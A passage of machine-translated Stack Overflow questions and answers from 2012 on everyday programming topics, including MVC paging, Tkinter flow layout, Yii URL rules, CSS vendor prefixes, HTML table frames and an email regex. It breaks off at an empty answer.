        view.items = models.Skip((page - 1) * user.Preferences.ResultsPerPage).Take(user.Preferences.ResultsPerPage).ToList();

        //build paging url used by the jQuery Ajax function
        view.PagingInfo.UrlGetMore = Url.RouteUrl("RouteList", new { page = view.PagingInfo.CurrentPage + 1 });
    }

    if (page == 1) {
        return View(view);
    } else {
        return PartialView("ListPartial", view);
    }

} 
```

HTH。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T21:22:31.070

> 这甚至可以使用 mvc 帮助程序或 mvc.pagedlist 吗？

是的，但是您当然必须协调客户端请求与服务器端操作来处理实际的数据分页。从这个意义上说，它不像 WebForms 那样简单，但它仍然是可能的。

[这是](http://czetsuya-tech.blogspot.com/2011/05/mvc3-dynamic-search-paging-using.html)一个使用 PagedList 将每个返回的项目呈现在其自己的表中的示例，由水平规则分隔。您应该能够轻松地修改示例中的 HTML 以生成您想要的任何渲染。

# python - Matlab Save() & Load() 方法到 python 等效

> ID：13076667
> 
> 赞同：0
> 
> 时间：2012-10-25T20:23:59.030
> 
> 标签：python, matlab

我是 Python 新手，我需要将一些我必须的 Matlab 代码转换为 Python。这是我的代码：

```
 save(myFile, 'list','config');
else
    load(myfile, 'list');
end 
```

我一直在寻找 Python 中，我似乎无法找到一个等效的方法。任何帮助将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T20:27:20.637

[在这里](http://docs.scipy.org/doc/numpy/reference/routines.io.html)查看 numpy IO 例程，它们可以处理各种格式。

# python - 如何在 TkInter 中创建平铺布局/流布局？

> ID：13076668
> 
> 赞同：6
> 
> 时间：2012-10-25T20:24:01.657
> 
> 标签：python, tkinter, tk, flowlayout

我想用标签填充我的窗口，并且我希望它们在列大于当前窗口（或更确切地说是父框架）大小时换行。

我尝试过使用`grid`布局，但是我必须自己计算每行内容的大小，才能知道何时将下一个元素放在下一行中。

我问的原因是因为我想创建某种平铺文件图标。

`FlowLayout`或者换个方式问， TkInter有没有类似 Swing 的东西？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T20:35:05.337

当我想要这样的东西时，我要做的就是将文本小部件用于容器。文本小部件可以嵌入小部件，它们就像文本一样换行。只要您的小部件高度相同，效果就非常好。

例如（根据作者的要求从问题中剪切和粘贴）：

```
textwidget = tk.Text(master)
textwidget.pack(side=tk.LEFT, fill=tk.BOTH)
for f in os.listdir('/tmp'):
    textwidget.window_create(tk.INSERT, window=tk.Label(textwidget, text=f)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-07-26T14:13:03.897

#### 这是一种在框架内进行流动行为的方法。

我写了一个函数来做到这一点。基本上，您将一个框架传递给函数（不是根或顶层），该函数将查看框架的所有子级，通过它们测量它们的大小并将它们放置在框架中。

##### 这是放置程序

*   放置第一个小部件，并将 x 移动等于其宽度的量。
*   测量下一个小部件。
*   如果放置下一个小部件会导致它超出框架宽度，则将其 x 值提升为 0 并将其向下提升到等于当前行中最大小部件的值（开始新行）。
*   重置最大小部件的值，因为您要开始新行。
*   不断重复，直到放置所有小部件。

##### 将该过程绑定到调整框架事件的大小。

##### 我使用了 3 个函数来完成这项工作：

1.  运行过程的函数。
2.  将框架的大小调整绑定到函数的函数。
3.  取消绑定框架大小调整的功能。

### 以下是功能：

```
from tkinter import *

def _reorganizeWidgetsWithPlace(frame):
    widgetsFrame = frame
    widgetDictionary = widgetsFrame.children
    widgetKeys = []  # keys in key value pairs of the childwidgets

    for key in widgetDictionary:
        widgetKeys.append(key)

    # initialization/priming loop
    width = 0
    i = 0
    x = 0
    y = 0
    height = 0
    maxheight = 0
    # loop/algorithm for sorting
    while i < len(widgetDictionary):
        height = widgetDictionary[widgetKeys[i]].winfo_height()
        if height > maxheight:
            maxheight = height

        width = width + widgetDictionary[widgetKeys[i]].winfo_width()

        # always place first widget at 0,0
        if i == 0:
            x = 0
            y = 0
            width = widgetDictionary[widgetKeys[i]].winfo_width()

        # if after adding width, this exceeds the frame width, bump
        # widget down.  Use maximimum height so far to bump down
        # set x at 0 and start over with new row, reset maxheight
        elif width > widgetsFrame.winfo_width():
            y = y + maxheight
            x = 0
            width = widgetDictionary[widgetKeys[i]].winfo_width()
            maxheight = height

        # if after adding width, the widget row length does not exceed
        # frame with, add the widget at the start of last widget's
        # x value

        else:
            x = width-widgetDictionary[widgetKeys[i]].winfo_width()

        # place the widget at the determined x value
        widgetDictionary[widgetKeys[i]].place(x=x, y=y)
        i += 1
    widgetsFrame.update()

def organizeWidgetsWithPlace(frame):
    _reorganizeWidgetsWithPlace(frame)
    frame.bind("<Configure>", lambda event: _reorganizeWidgetsWithPlace(frame))
    _reorganizeWidgetsWithPlace(frame)

def stopOrganizingWidgetsWithPlace(frame):
    frame.unbind("<Configure>") 
```

### 以下是它们的使用示例：

```
def main():
    root = Tk()
    root.geometry("250x250")
    myframe = Frame(root)
    # make sure frame expands to fill parent window
    myframe.pack(fill="both", expand=1)

    buttonOrganize = Button(myframe, text='start organizing',
                            command=lambda: organizeWidgetsWithPlace(myframe))
    buttonOrganize.pack()

    buttonStopOrganize = Button(myframe, text='stop organizing',
                                command=lambda: stopOrganizingWidgetsWithPlace(myframe))
    buttonStopOrganize.pack()

    ##### a bunch of widgets #####
    button = Button(myframe, text="---a random Button---")
    canvas = Canvas(myframe, width=80, height=20, bg="orange")
    checkbutton = Checkbutton(myframe, text="---checkbutton----")
    entry = Entry(myframe, text="entry")
    label = Label(myframe, text="Label", height=4, width=20)
    listbox = Listbox(myframe, height=3, width=20)
    message = Message(myframe, text="hello from Message")
    radioButton = Radiobutton(myframe, text="radio button")
    scale_widget = Scale(myframe, from_=0, to=100, orient=HORIZONTAL)
    scrollbar = Scrollbar(myframe)
    textbox = Text(myframe, width=3, height=2)
    textbox.insert(END, "Text Widget")
    spinbox = Spinbox(myframe, from_=0, to=10)

    root.mainloop()

main() 
```

##### 注意：

您不需要对它们进行网格化、打包或放置。只要你指定了框架，当函数被调用时，这一切都会立即完成。所以这很方便。如果您对一个小部件进行网格化，然后尝试打包另一个小部件，然后尝试放置另一个小部件，并且您会收到只能使用一个几何管理器的错误，这可能会很烦人。我相信这只会覆盖以前的选择并放置它们。我相信你可以把这个功能放进去，它会接管管理。到目前为止，这一直对我有用，但我认为你真的不应该尝试混合和匹配几何管理器。

请注意，最初按钮是打包的，但在按下按钮后，它们会被放置。

我为函数添加了“WithPlace”命名，因为我有一组类似的函数，它们与网格管理器非常相似。

# php - Yii Api 版本 urlManager w/ parseUrl

> ID：13076673
> 
> 赞同：1
> 
> 时间：2012-10-25T20:24:16.667
> 
> 标签：php, yii

我是 Yii 的新手，我正在尝试实现 parseUrl 来管理 url 上的 API 版本。我想将 /api/1.0/... 重定向到控制器 apiV1.0。

Main.php（urlManager 规则）：

```
...
array('class' => 'application.components.ApiVersion'),
... 
```

ApiVersion.php：

```
<?php
    class ApiVersion extends CBaseUrlRule
    {
    public $connectionID = 'db';

    public function createUrl($manager,$route,$params,$ampersand)
    {
        if ($route==='car/index')
        {
            if (isset($params['manufacturer'], $params['model']))
                return $params['manufacturer'] . '/' . $params['model'];
            else if (isset($params['manufacturer']))
                return $params['manufacturer'];
        }
        return false;  // this rule does not apply
    }

    public function parseUrl($manager,$request,$pathInfo,$rawPathInfo)
    {
        if (preg_match('%^(\w+)(/(\w+))?$%', $pathInfo, $matches))
           $url =  $match[1] .  $match[2]; // BUILD YOUR URL (controllerName/actionName)
           $this->redirect(array($url));
        }
        return false;
    }
} 
```

我对它的工作原理非常迷茫，有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T08:03:50.357

在您的函数中，正则表达式检查路径是否类似于“api/num_of_version/your_model/an_id”

因此，如果您的 url 与您的条件匹配，则必须设置 get 值：

```
$_GET['apiversion'] = $matches[2];
$_GET['model'] = $matches[4];
$_GET['id'] = $matches[6]; 
```

并根据您返回良好控制器的版本：

```
return "apiV" . $_GET['apiversion'] . "/view"; 
```

您需要了解的一些链接：

*   [preg_match 是如何工作的（$matches 的结构是什么）](http://php.net/manual/fr/function.preg-match.php)
*   [Yii 自定义 Url 类](http://www.yiiframework.com/doc/guide/1.1/en/topics.url#using-custom-url-rule-classes)

编辑：如果您在某个特定点遇到麻烦，请现在告诉我，我将尝试详细说明我在这一点上的回答。

# regex - 使用 RegEx for Coldfusion查找标签之间的文本，包括换行符

> ID：13076675
> 
> 赞同：2
> 
> 时间：2012-10-25T20:24:23.797
> 
> 标签：regex, coldfusion

我正在尝试从通过 CFHTTP 请求收到的 HTML 内容中提取 javascript 代码。

只要标签之间的代码中没有换行符，我就有这个简单的正则表达式可以捕获所有内容。

```
var result=REMatch("<script[^>]*>(.*?)</script>",html); 
```

这将捕获：

```
<script>testtesttest</script< 
```

但不是

```
<script>
testtest

</script> 
```

我曾尝试将 (?m) 用于多行，但它不是那样工作的。我正在使用[参考](http://help.adobe.com/en_US/ColdFusion/9.0/Developing/WSc3ff6d0ea77859461172e0811cbec0a38f-7ffb.html)来解决它，但我只是没有用正则表达式得到它。

注意，脚本标签之间通常会有 javascript，而不是简单的文本，还有像 {}();:-_ 等字符。

谁能帮我吗？

干杯

[[更新]]谢谢大家，我会尝试解决方案。我喜欢正则表达式，因为但我也会研究 HTML Parser。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T21:54:18.177

`(?m)`多行模式用于制作`^`和`$`匹配换行符（不仅仅是默认的字符串的开始/结束），但您在这里尝试做的是`.`包含换行符 - 因为您想要`(?s)`（全点模式）。

但是，我可能不会使用正则表达式来执行此操作 - **HTML 解析器是一种更强大的解决方案**。以下是使用[jSoup](http://jsoup.org)的方法：

```
var result = jsoup.parse(html).select('script').text(); 
```

有关在 CF 中使用 jSoup 的更多详细信息，[请参见此处](http://www.bennadel.com/blog/2358-Parsing-Traversing-And-Mutating-HTML-With-ColdFusion-And-jSoup.htm)，或者您可以使用[CF10 附带的](http://www.bennadel.com/blog/2341-ColdFusion-10-Parsing-Dirty-HTML-Into-Valid-XML-Documents.htm)[TagSoup](http://home.ccil.org/~cowan/XML/tagsoup/)解析器（因此您无需担心 jars/etc）。

如果你真的想要正则表达式，那么你可以使用这个：

```
var result = rematch('<script[^>]*>(?:[^<]+|<(?!/script>))+',html); 
```

与使用`(?s).*?`这避免匹配空块不同（但在某些边缘情况下它仍然会失败 - 如果需要准确性，请使用 HTML 解析器）。

要仅从第一个脚本块中提取文本，您可以使用以下命令去除脚本标记：

```
result = ListRest( result[1] , '>' ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T21:59:23.873

您可以使用点匹配所有模式或替换`.`为`[\s\S]`以获得相同的效果。

```
<script[^>]*>[\s\S]*?</script> would match everything including newlines. 
```

# if-statement - 检查资源类型是静态资源还是文档资源

> ID：13076676
> 
> 赞同：0
> 
> 时间：2012-10-25T20:24:25.883
> 
> 标签：if-statement, modx-revolution, television

我想知道在条件语句方式上检查使用的资源是静态的还是文档的正确语法是什么？我有一个可用于 2 种不同类型资源的模板。

所以条件语句可能是这样的：

> [[+模板:is= `static`:then= `This is static resource`:else= `This is document resource`]]

任何人都知道如何在MODx中做到这一点？我正在使用 MODx 革命最新版本。

谢谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T01:26:52.013

您想检查相关资源的 [[*class_key]] 变量。

```
[[+class_key:is='modDocument':then='This is document resource']] 
```

你也有 modWebLink 和 modSymLink，我不知道静态资源是什么〜在猜测 modStatic？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-25T07:34:12.263

这是很晚才出现的，但只是为了以后可能出现的人的利益，静态资源的关键是 modStaticResource。

# php - 如何在 PHP 中创建一个显示为链接以外的其他内容的链接？

> ID：13076678
> 
> 赞同：0
> 
> 时间：2012-10-25T20:24:30.707
> 
> 标签：php, text, web, hyperlink

我正在尝试使用 PHP 创建一个链接，将我带到一个新网站，但我不希望出现实际的链接地址。我需要在此处显示“文本”并将该文本链接到 www.example.com

我有一个脚本可以为我创建一个链接，但它显示“www.example.com”而不是“此处的文本”。

谢谢你的帮助。

```
function makeURL($URL) {
$URL = eregi_replace('(((f|ht){1}tp://)[-a-zA-Z0-9@:\+.~#?&//=]+)','<a href=\\1>\\1</a>', $URL);
$URL = eregi_replace('([[:space:]()[{}])(www.[-a-zA-Z0-9@:\+.~#?&//=]+)','<a href=\\1>\\1</a>', $URL);
$URL = eregi_replace('([_\.0-9a-z-]+@([0-9a-z][0-9a-z-]+\.)+[a-z]{2,3})','<a href=\\1>\\1</a>', $URL);
return $URL;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:27:07.953

这听起来像一个 HTML 问题：

```
<a href="www.yourwebsite">Some text that is a link</a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:30:06.460

据我了解，当用户将鼠标悬停在链接上时，您希望阻止显示链接地址。

这是jQuery的解决方案

```
<a data-link="www.example.com" class="hidden-link">Text here</a>

jQuery(function($) {
    $('a.hidden-link').on('click', function(e) {
        e.preventDefault();
        document.location.href = $(this).data('link');
    });
}); 
```

# javascript - 右键单击时出现两次警报

> ID：13076679
> 
> 赞同：0
> 
> 时间：2012-10-25T20:24:33.857
> 
> 标签：javascript, jquery, redirect, alert

我有一些代码可以检查鼠标所在位置的条件，如果它是真的，它会创建一个警报然后重定向。

它工作正常，但是如果您右键单击某处，然后左键单击一个条件为真的区域，然后它会发出警报，您单击确定，然后再次发出警报，您单击确定，然后它会重定向。

我只希望它发出一次警报然后重定向。

```
$(document).ready(function(){ 
```

...

```
 $(document).bind('mousemove', function(e){ 
```

...

```
 if(20 > e.pageX)){
      alert("You did it!");
      window.location.href = "http://www.google.com";
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:27:01.670

解绑鼠标移动。[mousemove](http://api.jquery.com/mousemove/)将在鼠标移动时触发，因此它可以在轻微的鼠标移动中多次调用您的函数。防止它在工作完成后解除绑定事件

```
$(document).ready(function(){
...

  $(document).bind('mousemove', function(e){
...

    if(20 > e.pageX)){
       $(document).unbind('mousemove');
      alert("You did it!");
      window.location.href = "http://www.google.com";
    }
  } 
```

}

# html - Css3 在 firefox 中没有工作，ie.it 在 google chrome 中工作

> ID：13076685
> 
> 赞同：-1
> 
> 时间：2012-10-25T20:24:58.803
> 
> 标签：html, css

我在css3中将部分标签与左侧对齐，将标签右侧对齐。它在谷歌浏览器中工作。但它在 Firefox 和 Internet Explorer 中不起作用。有人能说出为什么不起作用。这里是html5代码

```
<!DOCTYPE html >
<html lang="en">
<head>
<meta charset="urf-8" />
<title>Bruno Website </title>
<link rel="stylesheet" href="main.css" >
</head>

<body>
    <div id=big_wrapper>
    <header id="top_header">
       <h1> Welcome to HTML5 </h1>
    </header>

    <nav id="top_menu">
        <ul>
            <li>Home</li>
            <li>Services</li>  
            <li>Tutorials</li>  
            <li>Conatct</li>        
        </ul>
    </nav>

    <div id="new_div">
    <section id="main_section">
        <article>
            <header>
                <hgroup>
                <h1>Tiltle of the article</h1>
                <h2>titile h2 </h2>
                </hgroup>
            </header>
                <p>This is my First Website in hTml5 </p>
            <footer>
                 <p>~BRuno thileeban</p>
            </footer>
        </article>
        <article>
            <header>
                <hgroup>
                <h1>Tiltle of the article2</h1>
                <h2>titile h2 2 </h2>
                </hgroup>
            </header>
                <p>This is my First Website in hTml5 2 </p>
            <footer>
                <p>~BRuno thileeban</p>
            </footer>
        </article>
    </section>
        <aside id="side_news">
            <h4>News</h4>
            HEllo we r doing good job
        </aside>
    </div>
    <footer id="the_footer">
    Copyright Bruno .....
    </footer>

    </div>
</body>

</html> 
```

这是css3代码

```
*
{ 
margin:0px;
padding:0px;
}
h1
{
 font: bold 20px Tahoma;
}
h2
{
font: bold 14px Tahoma;
}
header, section, footer, aside, nav, article, hgroup{ display:block;}
body
{
 width:100%;
 display:-webkit-box;
 -webkit-box-pack: center;
}
#big_wrapper{
 max-width: 1000px;
 margin:20px 0px;
 display:-webkit-box;
-webkit-box-orient: vertical;
-webkit-box-flex:1;
}
#top_header { background:yellow;
border:3px solid black;
padding:20px;
}
#top_menu{ border:red;
background:blue;
color:white;
}
#top_menu li { 
display:inline-block;
list-style:none;
padding:5px;
font:bold 14px tahoma;
 }
 #new_div{ 
  display:-webkit-box;
  -webkit-box-orient:horizontal;
  }
  #main_section
  {
  border:1px solid blue;
  -webkit-box-flex:1;
  margin:20px ;
  padding:20px;

  }

  #side_news{
    border:1px solid red;
    margin:20px 0px;
    padding:30px;
    background: #66CCCC;

  }
  #the_footer{
  text-align:center;

   padding:20px;
   border-top:2px solid green;
  }
  article{ background:#FFFBCC; border:1px solid red; padding:20px; margin-bottom:15px;}
  article footer{ text-align:right;} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T11:35:01.903

您已选择在您的代码中仅支持*webkit*（Google Chrome 所基于的）。要支持其他浏览器使用的渲染引擎，您需要进行一些更改。

在您使用的任何地方`-webkit-*`，复制该行和下面的 use `-moz-*`，再次使用`-o-*`and `-ms-*`，然后再一次不带任何前缀。网络浏览器将丢弃它不理解的那些。

例如，`-webkit-box-flex:1;`变成

```
-webkit-box-flex:1; /* chrome, safari, etc */
-moz-box-flex:1;    /* Firefox, seamonkey etc */
-o-box-flex:1;      /* Opera */
-ms-box-flex:1;     /* MSIE */
box-flex:1;         /* Any that support full implementation */ 
```

但是，应该注意的是，[*这是原始 CSS 灵活框布局模块标准的属性，正在被新标准取代。*](https://developer.mozilla.org/en-US/docs/CSS/-moz-box-flex)您可能有兴趣[`flex`](https://developer.mozilla.org/en-US/docs/CSS/flex)改用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T23:18:32.787

您在 CSS 中使用了多个`-webkit`前缀（例如：`-webkit-box-orient: vertical;`）。这些规范仅适用于某些浏览器，尤其是 Chrome。

[像float](https://developer.mozilla.org/en-US/docs/CSS/float)这样的标准 CSS 前缀会是更好的选择。

PS - 没有像`urf-8`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-26T11:28:40.973

您似乎只使用了`-webkit`特定于基于 webkit 的浏览器（例如 safari 和 chrome）的前缀，或者使用其他前缀 ( `-moz`, `-o`)，或者使用[Compass](http://compass-style.org/)，这对于维护前缀非常有用，因为代码始终反映最新的浏览器支持。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-26T11:41:35.903

根据定义，供应商前缀只应该在单个供应商的浏览器中工作，因为它们表示自定义规则或尚未标准化的事物的实验性实现（尽管对此存在一些争议）。

该`-webkit-`位是供应商前缀，仅适用于使用[WebKit 渲染引擎](http://www.webkit.org/)的浏览器，其中最流行的是 Chrome 和 Safari。 这是其他渲染引擎[的已知供应商前缀列表。](http://wiki.csswg.org/spec/vendor-prefixes#known-prefixes)因此，如果您采用此规则：

```
body {
    width:100%;
    display: -webkit-box;
    -webkit-box-pack: center;
} 
```

你所拥有的并不是真正的 CSS3，而是 WebKit 自定义 CSS。CSS3，如果您使用的规则和属性得到批准，看起来像这样（**不要使用此代码**）：

```
body {
    width: 100%;
    display: box;
    box-pack: center;
} 
```

`box`在标准和最终确定之前，此规则将在浏览器中不起作用`box-pack`，为了获得最大的当前支持，您的规则必须如下所示（**再次，不要使用此代码**）：

```
body {
    width:100%;
    display: -webkit-box;
    display: -moz-box;
    display: -ms-box;
    display: -o-box;
    display: box;
    -webkit-box-pack: center;
    -moz-box-pack: center;
    -ms-box-pack: center;
    -o-box-pack: center;
    box-pack: center;
} 
```

这种复杂性是人们使用[Compass](http://compass-style.org/)等工具生成样式表的原因。

然而，我一直在说你不应该使用这段代码，原因是在 CSS3 中不再有任何`box`计划`box-pack`。它们已被[使用`flex`关键字](https://developer.mozilla.org/en-US/docs/CSS/Using_CSS_flexible_boxes)的新方法所取代。尽管`flex`替换`box`它们的工作方式并不完全相同，因此它不是直接翻译。对供应商前缀`box`属性的支持将淡出或恢复为自定义 CSS（整个`box`方法一开始是自定义 CSS，Firefox 用于在浏览器工具栏中布局 UI 元素，即根本不适用于网页）。

这是您使用供应商前缀 CSS 规则所面临的风险——行为甚至语法都可能发生变化。如果您打算使用它们，您必须掌握[规范](http://www.w3.org/TR/css3-flexbox/)，并仔细监控浏览器中实验性实现的进度。

# algorithm - 在树结构中，找到根节点和 k 个节点之间的最高键

> ID：13076687
> 
> 赞同：1
> 
> 时间：2012-10-25T20:25:20.183
> 
> 标签：algorithm, tree

需要定义一个 seek(u,v) 函数，其中 u 是树中的新节点（我要开始搜索的节点），v 是新节点下面的后代数，这个函数会返回 index键值最高的。这棵树没有一个 BST，可以有许多子节点。例子：

```
input:
5             // tree with 5 nodes
1 3 5 2 7     // the nodes' keys
1 2           // 1 and 2 are linked
2 3           // 2 and 3 are linked
1 4           // 1 and 4 are linked
3 5           // 3 and 5 are linked
4             // # of seek() requests
2 3           // index 2 of tree, which would be key 5, 3 descendants from index 3 
4 1           // index 4 of tree, but only return highest from index 4 to 4 (it would 
              // return itself)
3 2           // index 3, next 2 descendants
3 2           // same

output:
5             // Returned index 5 because the 7 is the highest key from array[3 'til 5]
4             // Returned index 4 because the range is one, plus 4's children are null
5             // Returned index 5 because the 7 is the highest key from array[4 'til 5]
5             // Same as prior line 
```

我正在考虑将新根放入新的红黑树中，但找不到有效保存每个节点的后继或前驱信息的方法。还考虑放入一个数组，但由于不平衡和未排序树的性质，它不能保证我的树会被排序，而且因为它不是 BST，所以我不能执行无序树遍历。关于如何从特定范围获得最高键的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T15:25:13.923

我不太明白你的意思：“新节点下的后代数量”。正如你所说的那样，它意味着存在某种强加的树行走，或者至少是你必须访问节点的顺序。在这种情况下，最好更彻底地解释你的意思。

在其余答案中，我假设您的意思是与您的距离。

从纯算法的角度来看，由于您不能对树进行任何假设，因此您必须访问图的所有相关顶点（即距离 u <= v 的顶点）以获得结果。这意味着任何部分树遍历（例如深度优先或广度优先）都应该足够且必要（因为您必须访问 u 以下的所有相关节点），因为我们访问节点的顺序无关紧要。

如果可以的话，使用递归函数 seek'(u,v) 会更简单，它返回定义如下的一对 (index, key)：

*   如果 v > 1，您将 seek'(u,v) 定义为在配对 (u, key(u)) 中最大化其第二个分量的配对，并将 seek(w,v-1) 定义为 u 的 w 儿子。
*   否则 (v = 1) 你将 seek'(u,v) 定义为 (u, key(u))

然后你有 seek(u,v) = first(seek'(u,v))。

我所说的所有内容都假定您已经从输入构建了一个树，或者您可以轻松地从其索引中获取节点及其子节点的键。

# jquery - domready 事件和 iframe

> ID：13076690
> 
> 赞同：0
> 
> 时间：2012-10-25T20:25:27.337
> 
> 标签：jquery, iframe, extjs, domready

如果我做...

```
Ext.onReady(function(){alert('Ready');}) 
```

或者...

```
jQuery(document).ready(function(){alert('Ready');}) 
```

...如果我在运行它的页面上有一个 iframe，则这些函数在 iframe 加载其内容之前不会运行。

这不是我认为这些 domready 函数应该如何工作的方式。我认为他们特别没有等到加载图像和 iframe 之类的东西。

有人可以启发我吗？有没有我可以使用的不等待 iframe 的 domready 方法？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T20:49:24.130

只需**在标记中设置您的 iframe src="" 即可**。并在您的**document.ready**处理程序中设置**$iframe.attr('src', "http://....")**。这是我们通常在相同情况下的项目中所做的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:36:05.700

您的问题与我在加载 jquery 选项卡时遇到的 fouc 问题有关已经完成。

[在这里](http://fundapass.blogspot.com/2012/06/v-behaviorurldefaultvmlo_22.html)查看我的情况

# php - 使用 PHP 将部分文本回显到另一个页面或 Div

> ID：13076693
> 
> 赞同：0
> 
> 时间：2012-10-25T20:25:35.790
> 
> 标签：php, echo

我是 PHP 新手，任何帮助或指导都会很棒！我不一定需要答案，只需要一些输入。我想将一个页面的一部分文本显示到另一个页面的 div 上。

第 1 页

```
<div id="content">
Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium
laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis 
architecto beatae vitae dicta sunt laudantium, totam rem aperiam, eaque ipsa quae ab     illo 
</div> 
```

第2页

```
<div id="portionofcontent">
Sed ut perspiciatis unde omnis iste natus error sit voluptatem
accusantium...
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T20:27:05.993

将您想要拉入各个页面的文本放入其自己的名为whatever.php 的文件中，然后`<?php include('whatever.php'); ?>`在div 中使用。

`yourtext.php`更新：您可以使用以下代码创建一个文件：

`<?php $text = 'Put the text you want to display on multiple pages here.'; ?>`

然后将`<?php include('yourtext.php'); ?>`文件的标题放在某处，并`<?php echo $text; ?>`在要显示文本的页面内容中使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T10:09:22.900

如果它是静态文本，那么它几乎就是 ennui 所说的，但我会采取另一种方式：

读取文件的方法也有很多。如果它只是纯文本，那么`file_get_contents($file)`假设它不是一个大文件可能会更好。

尝试这个：

内容.txt

`This is part of a rather long sentence which goes on and on and on and on and on and on and on and on and on and on and on and on and on and on and on and on and on until finally it reaches the end`

page1.php

```
<?php  
 $txt = file_get_contents('./content.txt');
 echo $txt;
?> 
```

page2.php

```
<?php    
 $txt = file_get_contents('./content.txt');
 echo substr($txt, 0, 100); //substring(text, start, length) nb. start is from 0
?> 
```

您还可以使用 , 之类的命令`fopen`打开`fgets`文件并仅读取文件的一部分，但我认为现阶段对您来说可能有点复杂

# html - html表格中frame属性box和border有什么区别

> ID：13076700
> 
> 赞同：2
> 
> 时间：2012-10-25T20:25:52.297
> 
> 标签：html, html-table, border, frame

我正在上一些关于 Web 编程的课程，包括讲师在内的课程中没有人能说出关于 html 表格的框架值框和边框之间的区别。这是我正在谈论的一个例子。

```
<table frame="border">
<!-- some basic table data -->
</table>

<table frame="box">
<!-- some basic table data -->
</table> 
```

据我所知，这两张表将以相同的方式呈现。是否有任何一开始可能不明显的潜在差异，或者是否有正确或错误的方式来使用它们？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T20:28:08.413

没有区别; 他们是彼此的别名。从[HTML 4.01 规范](http://www.w3.org/TR/html401/struct/tables.html#h-11.3.1)：

> 此属性指定围绕表格的框架的哪些边将是可见的。可能的值：
> 
> *   ...
> *   `box:`所有四个方面。
> *   `border:`所有四个方面。

今天，几乎唯一正确使用它们的方法就是*不*使用它们。表格边框样式应该使用 CSS 而不是表现属性来定义，这`frame`是一个例子，虽然是一个相当模糊的例子。无论如何，浏览器对该属性的支持[似乎相当不完整](http://reference.sitepoint.com/html/table/frame#compatibilitysection)，这也是由于其晦涩难懂。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T20:28:07.550

box 外边框显示在所有四个边上

边框 外边框显示在所有四个边上

即它们是相同的 [http://www.w3schools.com/tags/att_table_frame.asp](http://www.w3schools.com/tags/att_table_frame.asp)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T21:39:03.687

正如已经说过的那样，它们做同样的事情，无论如何你都不应该使用 frame 属性。

要了解为什么同一事物有两个不同的值，有必要阅读[RFC 1942 HTML Tables](http://www.ietf.org/rfc/rfc1942.txt)，它说：

> 包含值“Border”是为了向后兼容已部署的浏览器。如果文档包含`<TABLE BORDER>`用户代理，则会看到 FRAME=BORDER 和 BORDER= *implicit*。如果文档包含`<TABLE BORDER=_n_>`，则用户代理应将其视为 FRAME=BORDER，除非*n=0*适合 FRAME=VOID。
> 
> 注意：最好为 FRAME 选择与 RULES 属性和用于对齐的值一致的值。例如：none、top、bottom、topbot、left、right、leftright、all。不幸的是，SGML 要求枚举的属性值对于每个元素都是唯一的，与属性名称无关。这会导致“none”、“left”、“right”和“all”立即出现问题。已选择 FRAME 的值以避免与 RULES、ALIGN 和 VALIGN 属性发生冲突。这提供了一种对未来进行验证的措施，因为预计在本规范的未来修订中，FRAME 和 RULES 属性将被添加到其他表格元素中。另一种方法是使 FRAME 成为 CDATA 属性。

因此，在编写规范之前，浏览器已经使用了“边框”，但与 SGML 的细微之处不兼容，因此添加了“框”以提供一种与 SGML 兼容的方式来做同样的事情。

因为浏览器实际上并不遵循 SGML 规则，所以不容易看到上面的效果，但是 HTML5 之前的验证器做到了，并且可能会看到很小的效果。考虑这个标记：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" 
                 "http://www.w3.org/TR/html4/strict.dtd">
<title>Test</title>
<table border border=5>
<tr><td>Test</td></tr>
</table> 
```

通常有两个同名的属性会导致验证器报告错误，但是在 W3C HTML 验证器上尝试一下，您会看到它通过了验证。那是因为验证器将第一个`border`属性视为的缩写形式，`frame="border"`因此没有名称冲突。

另一方面，浏览器确实会看到名称冲突并且会忽略该`border=5`属性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-25T20:31:11.573

它们几乎相同，但由于它们的名称上下文不同，它们取决于不同的浏览器支持。

frame 意味着应该有所有四个边框，而 box 是相同的，但可以与规则一起使用。像这样：rules="none"

# php - 使用正则表达式验证具有特定域的电子邮件

> ID：13076706
> 
> 赞同：1
> 
> 时间：2012-10-25T20:26:18.867
> 
> 标签：php, regex, validation, preg-match, expression

我已经用这个表达式玩了一个小时了，但我似乎无法让它发挥作用。我需要验证具有特定域的电子邮件。电子邮件必须采用以下格式：

名字.姓氏@abc.domain

域可以是 .ca .com 或 .org，名字和姓氏必须介于 4 到 10 个字符之间。这是我现在拥有的代码

```
/^[a-z]{4,10}\.[a-z]{4,10}[@]abc\.(com|ca|org)$/i 
```

谁能看到我做错了什么？先感谢您！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:30:03.133

